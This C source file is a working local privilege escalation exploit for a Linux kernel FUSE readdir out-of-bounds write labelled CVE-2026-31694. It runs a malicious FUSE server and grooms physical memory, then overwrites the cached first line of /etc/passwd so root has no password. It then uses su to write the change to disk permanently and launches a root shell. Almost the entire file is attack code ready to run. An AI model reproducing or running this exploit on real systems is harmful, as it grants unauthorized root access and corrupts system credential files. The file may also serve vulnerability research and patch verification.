/*
 * CVE-2026-31694: FUSE readdir cache OOB write - LPE
 *
 * A missing bounds check in fs/fuse/readdir.c:fuse_add_dirent_to_cache().
 * A FUSE server returns a dirent with namelen=4095, serializing to 4120
 * bytes. The kernel copies it into a single 4096-byte page-cache page and
 * overflows 24 server-controlled bytes into the next physical page.
 *
 * Affected: Linux 6.15+ (FUSE_NAME_MAX bump to PATH_MAX-1)
 * Fixed by: 51a8de6c50bf9
 *
 * Grooming: hold ~10% of free memory to drain PCP, then allocate pool.
 * Consecutive pool pages come from buddy splits -> physically adjacent.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <dirent.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/fuse.h>
#include <pthread.h>
#include <stdint.h>

#define PAGE_SZ           4096
#define FUSE_BUFSIZE      (64 * 1024)
#define DRAIN_BLOCK_SIZE  (256 * PAGE_SZ)
#define DRAIN_MAX_BLOCKS  1024
#define POOL_SIZE         128

static int drain_nblocks = 0;

#define OVERFLOW_NAMELEN  4095
#define OVERFLOW_RECLEN   4120
#define OVERFLOW_CTRL     23
#define FUSE_HDR_SZ       24

static const char PAYLOAD[OVERFLOW_CTRL] =
    "root::0:0:x:.:\n#######";
static const char MARKER[OVERFLOW_CTRL]  = "DEADBEEF_OOB_WRITE_HIT!";

#define FUSE_ROOT_ID_     1
#define DIR_NODEID_BASE   100
#define MAX_ATTEMPTS      200
#define WARMUP_ROUNDS     5

static int fuse_fd = -1;
static char *mountpoint = NULL;
static int attempt_num = 0;

static pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t cond_arrived = PTHREAD_COND_INITIALIZER;
static pthread_cond_t cond_respond = PTHREAD_COND_INITIALIZER;
static int readdir_arrived = 0;
static int readdir_respond = 0;

static void compute_drain_size(void)
{
    long free_kb = 0;
    FILE *f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f))
            if (sscanf(line, "MemFree: %ld kB", &free_kb) == 1) break;
        fclose(f);
    }
    if (free_kb <= 0) {
        drain_nblocks = 4;
    } else {
        long drain_bytes = (free_kb / 10) * 1024;
        drain_nblocks = (int)(drain_bytes / DRAIN_BLOCK_SIZE);
        if (drain_nblocks < 4) drain_nblocks = 4;
        if (drain_nblocks > DRAIN_MAX_BLOCKS) drain_nblocks = DRAIN_MAX_BLOCKS;
    }
    fprintf(stderr, "[drain] MemFree=%ldMB -> drain=%d blocks\n",
            free_kb / 1024, drain_nblocks);
}

static char passwd_backup[16384];
static ssize_t passwd_backup_len = 0;
static char dirent_buf[OVERFLOW_RECLEN];

static void die(const char *msg) { perror(msg); _exit(1); }

static void pin_cpu(int cpu)
{
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

/* ── FUSE protocol ──────────────────────────────────────────────── */

static void fuse_reply(uint64_t unique, int32_t error,
                       const void *data, size_t datalen)
{
    struct fuse_out_header oh = {
        .len = sizeof(oh) + datalen, .error = error, .unique = unique,
    };
    struct iovec iov[2] = {{ &oh, sizeof(oh) }, { (void*)data, datalen }};
    (void)writev(fuse_fd, iov, datalen ? 2 : 1);
}
static void fuse_reply_err(uint64_t u, int e) { fuse_reply(u, -e, NULL, 0); }
static void fill_attr(struct fuse_attr *a, uint64_t ino, int dir)
{
    memset(a, 0, sizeof(*a)); a->ino = ino;
    a->size = dir ? 4096 : 0; a->mode = dir ? (S_IFDIR|0755) : (S_IFREG|0644);
    a->nlink = dir ? 2 : 1; a->uid = getuid(); a->gid = getgid(); a->blksize = 4096;
}
static void handle_init(struct fuse_in_header *h, void *body)
{
    (void)body;
    struct fuse_init_out out = {0};
    out.major = FUSE_KERNEL_VERSION; out.minor = FUSE_KERNEL_MINOR_VERSION;
    out.max_background = 16; out.congestion_threshold = 12;
    out.max_write = 4096; out.time_gran = 1; out.max_pages = 2;
    fuse_reply(h->unique, 0, &out, sizeof(out));
}
static void handle_lookup(struct fuse_in_header *h, char *name)
{
    if (strncmp(name, "trigdir", 7) == 0) {
        uint64_t nid = DIR_NODEID_BASE + (uint64_t)attempt_num;
        struct fuse_entry_out out = {0};
        out.nodeid = nid; out.generation = 1;
        fill_attr(&out.attr, nid, 1);
        fuse_reply(h->unique, 0, &out, sizeof(out));
    } else fuse_reply_err(h->unique, ENOENT);
}
static void handle_getattr(struct fuse_in_header *h)
{
    struct fuse_attr_out out = {0};
    fill_attr(&out.attr, h->nodeid,
              h->nodeid == FUSE_ROOT_ID_ || h->nodeid >= DIR_NODEID_BASE);
    fuse_reply(h->unique, 0, &out, sizeof(out));
}
static void handle_opendir(struct fuse_in_header *h)
{
    struct fuse_open_out out = {0};
    out.fh = 0x100 + attempt_num; out.open_flags = (1<<3);
    fuse_reply(h->unique, 0, &out, sizeof(out));
}
static void handle_readdir(struct fuse_in_header *h, void *body)
{
    struct fuse_read_in *ri = body;
    if (ri->offset != 0) { fuse_reply(h->unique, 0, NULL, 0); return; }
    pthread_mutex_lock(&mtx);
    readdir_arrived = 1; pthread_cond_signal(&cond_arrived);
    while (!readdir_respond) pthread_cond_wait(&cond_respond, &mtx);
    readdir_respond = 0; readdir_arrived = 0;
    pthread_mutex_unlock(&mtx);
    fuse_reply(h->unique, 0, dirent_buf, OVERFLOW_RECLEN);
}
static void *fuse_loop(void *arg)
{
    (void)arg; char buf[FUSE_BUFSIZE];
    while (1) {
        ssize_t n = read(fuse_fd, buf, sizeof(buf));
        if (n < 0) { if (errno == ENODEV || errno == EBADF) break; continue; }
        struct fuse_in_header *h = (struct fuse_in_header *)buf;
        void *body = buf + sizeof(*h);
        switch (h->opcode) {
        case FUSE_INIT: handle_init(h, body); break;
        case FUSE_LOOKUP: handle_lookup(h, body); break;
        case FUSE_GETATTR: handle_getattr(h); break;
        case FUSE_OPENDIR: handle_opendir(h); break;
        case FUSE_READDIR: handle_readdir(h, body); break;
        case FUSE_RELEASEDIR: case FUSE_RELEASE: case FUSE_FLUSH:
            fuse_reply(h->unique, 0, NULL, 0); break;
        case FUSE_FORGET: break;
        case FUSE_STATFS: {
            struct fuse_statfs_out s = {0};
            s.st.blocks=1000; s.st.bfree=500; s.st.bavail=500;
            s.st.namelen=255; s.st.bsize=4096;
            fuse_reply(h->unique, 0, &s, sizeof(s)); break;
        }
        default: fuse_reply_err(h->unique, ENOSYS); break;
        }
    }
    return NULL;
}

static void build_dirent(const char *payload)
{
    struct fuse_dirent *d = (struct fuse_dirent *)dirent_buf;
    memset(dirent_buf, 0, sizeof(dirent_buf));
    d->ino = 1000; d->off = 1; d->namelen = OVERFLOW_NAMELEN; d->type = DT_REG;
    memset(d->name, 'A', OVERFLOW_NAMELEN);
    memcpy(d->name + (PAGE_SZ - FUSE_HDR_SZ), payload, OVERFLOW_CTRL);
    dirent_buf[OVERFLOW_RECLEN - 1] = '\n';
}

static void *trigger_readdir(void *arg)
{
    int a = *(int *)arg; pin_cpu(0);
    char path[512];
    snprintf(path, sizeof(path), "%s/trigdir_%d", mountpoint, a);
    DIR *d = opendir(path);
    if (!d) { perror("opendir"); return NULL; }
    (void)readdir(d); closedir(d); return NULL;
}
static void finish_readdir(pthread_t trig)
{
    pthread_mutex_lock(&mtx);
    readdir_respond = 1; pthread_cond_signal(&cond_respond);
    pthread_mutex_unlock(&mtx);
    pthread_join(trig, NULL);
}

/* ── Page pool with PCP drain ────────────────────────────────────── */

struct pool_state {
    void *drain_blocks[DRAIN_MAX_BLOCKS];
    int   drain_count;
    void *pool[POOL_SIZE];
};

static void alloc_pool(struct pool_state *st)
{
    st->drain_count = 0;
    for (int i = 0; i < drain_nblocks; i++) {
        st->drain_blocks[i] = mmap(NULL, DRAIN_BLOCK_SIZE,
                                   PROT_READ|PROT_WRITE,
                                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,
                                   -1, 0);
        if (st->drain_blocks[i] == MAP_FAILED) { st->drain_blocks[i] = NULL; break; }
        *(volatile char*)st->drain_blocks[i] = (char)i;
        *(volatile char*)(st->drain_blocks[i] + DRAIN_BLOCK_SIZE - PAGE_SZ) = (char)i;
        st->drain_count++;
    }
    for (int i = 0; i < POOL_SIZE; i++) {
        st->pool[i] = mmap(NULL, PAGE_SZ, PROT_READ|PROT_WRITE,
                           MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
        if (st->pool[i] != MAP_FAILED)
            *(volatile char*)st->pool[i] = (char)i;
    }
}

static void free_pool(struct pool_state *st)
{
    for (int i = 0; i < POOL_SIZE; i++)
        if (st->pool[i] && st->pool[i] != MAP_FAILED)
            { munmap(st->pool[i], PAGE_SZ); st->pool[i] = NULL; }
    for (int i = 0; i < st->drain_count; i++)
        if (st->drain_blocks[i])
            { munmap(st->drain_blocks[i], DRAIN_BLOCK_SIZE); st->drain_blocks[i] = NULL; }
    st->drain_count = 0;
}

/* ── PoC: overflow into own page ─────────────────────────────────── */

static int attempt_poc(void)
{
    attempt_num++;

    pthread_mutex_lock(&mtx);
    readdir_arrived = 0; readdir_respond = 0;
    pthread_mutex_unlock(&mtx);

    pthread_t trig;
    pthread_create(&trig, NULL, trigger_readdir, &attempt_num);
    pthread_mutex_lock(&mtx);
    while (!readdir_arrived) pthread_cond_wait(&cond_arrived, &mtx);
    pthread_mutex_unlock(&mtx);

    pin_cpu(0);

    struct pool_state st;
    memset(&st, 0, sizeof(st));
    alloc_pool(&st);

    int idx = (attempt_num % (POOL_SIZE - 1));
    void *page0 = st.pool[idx];
    void *page1 = st.pool[idx + 1];

    if (!page0 || page0 == MAP_FAILED || !page1 || page1 == MAP_FAILED) {
        free_pool(&st);
        finish_readdir(trig);
        return 0;
    }

    memset(page1, 'V', PAGE_SZ);
    munmap(page0, PAGE_SZ);
    st.pool[idx] = NULL;

    finish_readdir(trig);

    int hit = (memcmp(page1, MARKER, OVERFLOW_CTRL) == 0);
    free_pool(&st);
    return hit;
}

/* ── LPE: overflow into /etc/passwd page cache ───────────────────── */

static int attempt_lpe(void)
{
    attempt_num++;
    pin_cpu(0);

    struct pool_state st;
    memset(&st, 0, sizeof(st));
    alloc_pool(&st);

    int idx = (attempt_num % (POOL_SIZE - 1));
    void *before = st.pool[idx];
    void *after  = st.pool[idx + 1];

    if (!before || before == MAP_FAILED || !after || after == MAP_FAILED) {
        free_pool(&st);
        return 0;
    }

    pthread_mutex_lock(&mtx);
    readdir_arrived = 0; readdir_respond = 0;
    pthread_mutex_unlock(&mtx);

    pthread_t trig;
    pthread_create(&trig, NULL, trigger_readdir, &attempt_num);
    pthread_mutex_lock(&mtx);
    while (!readdir_arrived) pthread_cond_wait(&cond_arrived, &mtx);
    pthread_mutex_unlock(&mtx);

    int passwd_fd = open("/etc/passwd", O_RDONLY);
    if (passwd_fd < 0) die("open passwd");
    posix_fadvise(passwd_fd, 0, 0, POSIX_FADV_DONTNEED);

    munmap(after, PAGE_SZ);
    st.pool[idx + 1] = NULL;

    char tmp;
    (void)pread(passwd_fd, &tmp, 1, 0);

    munmap(before, PAGE_SZ);
    st.pool[idx] = NULL;

    finish_readdir(trig);

    char check[80] = {0};
    (void)pread(passwd_fd, check, 79, 0);
    int hit = (memcmp(check, "root::0:0:x:.:", 14) == 0);

    close(passwd_fd);
    free_pool(&st);
    return hit;
}

/* ── FUSE mount via fusermount3 ──────────────────────────────────── */

static int setup_fuse(void)
{
    int sv[2];
    mountpoint = strdup("/tmp/fuse_oob_XXXXXX");
    if (!mkdtemp(mountpoint)) die("mkdtemp");
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) die("socketpair");
    pid_t pid = fork();
    if (pid < 0) die("fork");
    if (pid == 0) {
        close(sv[0]); char e[32];
        snprintf(e, sizeof(e), "_FUSE_COMMFD=%d", sv[1]); putenv(e);
        execl("/bin/fusermount3", "fusermount3", mountpoint, NULL);
        execl("/usr/bin/fusermount3", "fusermount3", mountpoint, NULL);
        die("fusermount3");
    }
    close(sv[1]);
    struct msghdr msg = {0}; char cmsg_buf[CMSG_SPACE(sizeof(int))];
    char data; struct iovec iov = { &data, 1 };
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(sv[0], &msg, 0) < 0) die("recvmsg");
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (!cmsg || cmsg->cmsg_type != SCM_RIGHTS) return -1;
    fuse_fd = *(int*)CMSG_DATA(cmsg); close(sv[0]);
    int st2; waitpid(pid, &st2, 0);
    return (WIFEXITED(st2) && WEXITSTATUS(st2)==0) ? 0 : -1;
}

static void cleanup(void)
{
    if (!mountpoint) return;
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "fusermount3 -u %s 2>/dev/null; "
             "umount -l %s 2>/dev/null", mountpoint, mountpoint);
    (void)system(cmd); rmdir(mountpoint);
}

/* ── main ────────────────────────────────────────────────────────── */

int main(int argc, char **argv)
{
    int poc_only = 0, num_rounds = 50;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--poc") == 0) poc_only = 1;
        else if (strcmp(argv[i], "-n") == 0 && i+1 < argc)
            num_rounds = atoi(argv[++i]);
    }
    setbuf(stdout, NULL); setbuf(stderr, NULL); pin_cpu(0);

    compute_drain_size();

    printf("=== FUSE readdir OOB - CVE-2026-31694 ===\n");
    printf("=== drain %dMB + pool %d ===\n\n", drain_nblocks, POOL_SIZE);

    if (setup_fuse() < 0) {
        fprintf(stderr, "[-] fuse mount failed (need fusermount3?)\n");
        return 1;
    }
    printf("[+] FUSE at %s\n", mountpoint);

    if (!poc_only) {
        int bfd = open("/etc/passwd", O_RDONLY);
        if (bfd >= 0) {
            passwd_backup_len = read(bfd, passwd_backup, sizeof(passwd_backup) - 1);
            close(bfd);
            if (passwd_backup_len > 0) {
                passwd_backup[passwd_backup_len] = '\0';
                FILE *bf = fopen("/tmp/.passwd_backup", "w");
                if (bf) { fwrite(passwd_backup, 1, passwd_backup_len, bf); fclose(bf); }
                printf("[+] /etc/passwd backed up (%zd bytes)\n", passwd_backup_len);
            }
        }
    }

    pthread_t ft; pthread_create(&ft, NULL, fuse_loop, NULL);
    usleep(300000);

    if (poc_only) {
        build_dirent(MARKER);
        int hits = 0;
        for (int i = 0; i < num_rounds; i++) {
            printf("[%3d/%d] ", i+1, num_rounds); fflush(stdout);
            int r = attempt_poc();
            if (r) { hits++; printf("HIT (%d/%d=%.0f%%)\n", hits,i+1,100.0*hits/(i+1)); }
            else printf("miss\n");
            usleep(5000);
        }
        printf("\n=== %d/%d (%.1f%%) ===\n", hits, num_rounds, 100.0*hits/num_rounds);
        cleanup(); return (hits > 0) ? 0 : 1;
    }

    printf("--- Warmup ---\n\n");
    build_dirent(MARKER);
    int wh = 0;
    for (int i = 0; i < WARMUP_ROUNDS; i++) {
        printf("[*] W%d/%d ... ", i+1, WARMUP_ROUNDS); fflush(stdout);
        int r = attempt_poc();
        if (r) { wh++; printf("HIT (%d)\n", wh); } else printf("miss\n");
        usleep(5000);
    }
    printf("\n[+] Warmup: %d/%d (%.0f%%)\n", wh, WARMUP_ROUNDS, 100.0*wh/WARMUP_ROUNDS);

    if (wh == 0) {
        printf("[-] No warmup hits.\n");
        cleanup(); return 1;
    }

    printf("\n--- LPE ---\n\n");
    build_dirent(PAYLOAD);
    { char r[80]={0}; int fd=open("/etc/passwd",O_RDONLY);
      if(fd>=0){(void)pread(fd,r,79,0);close(fd);}
      char *nl=strchr(r,'\n'); if(nl)*nl=0;
      printf("[+] before: %s\n\n", r); }

    for (int i = 0; i < MAX_ATTEMPTS; i++) {
        printf("[*] LPE %d/%d ... ", i+1, MAX_ATTEMPTS); fflush(stdout);
        int result = attempt_lpe();
        if (result == 1) {
            printf("HIT!\n\n");
            printf("[+] Page cache corrupted\n");

            if (passwd_backup_len > 0) {
                char *first_nl = strchr(passwd_backup, '\n');
                if (first_nl) {
                    char new_passwd[16384];
                    int nlen = snprintf(new_passwd, sizeof(new_passwd),
                                        "root::0:0:root:/root:/bin/sh\n%s",
                                        first_nl + 1);
                    FILE *fp = fopen("/tmp/.passwd_new", "w");
                    if (fp) { fwrite(new_passwd, 1, nlen, fp); fclose(fp); }
                }
            } else {
                (void)system(
                    "tail -n +2 /tmp/.passwd_backup > /tmp/.passwd_tail && "
                    "echo 'root::0:0:root:/root:/bin/sh' > /tmp/.passwd_new && "
                    "cat /tmp/.passwd_tail >> /tmp/.passwd_new && "
                    "rm -f /tmp/.passwd_tail"
                );
            }

            printf("[+] Persisting + dropping caches as root...\n");
            (void)system(
                "echo '' | su -s /bin/sh -c '"
                "cp /tmp/.passwd_new /etc/passwd && "
                "chmod 644 /etc/passwd && "
                "rm -f /tmp/.passwd_new /tmp/.passwd_backup && "
                "echo 3 > /proc/sys/vm/drop_caches && "
                "echo [+] done"
                "' root 2>/dev/null"
            );

            printf("\n");
            char v[128]={0}; int fd=open("/etc/passwd",O_RDONLY);
            if(fd>=0){(void)pread(fd,v,127,0);close(fd);}
            char *nl=strchr(v,'\n'); if(nl)*nl=0;
            printf("========================================\n");
            printf("[+] /etc/passwd: %s\n", v);
            printf("[+] su -s /bin/sh root (empty password)\n");
            printf("========================================\n\n");

            cleanup();
            execl("/bin/su", "su", "-s", "/bin/sh", "root", NULL);
            (void)system("echo '' | su -s /bin/sh root");
            return 0;
        }
        printf("miss\n"); usleep(10000);
    }
    printf("\n[-] Failed after %d attempts\n", MAX_ATTEMPTS);
    cleanup(); return 1;
}
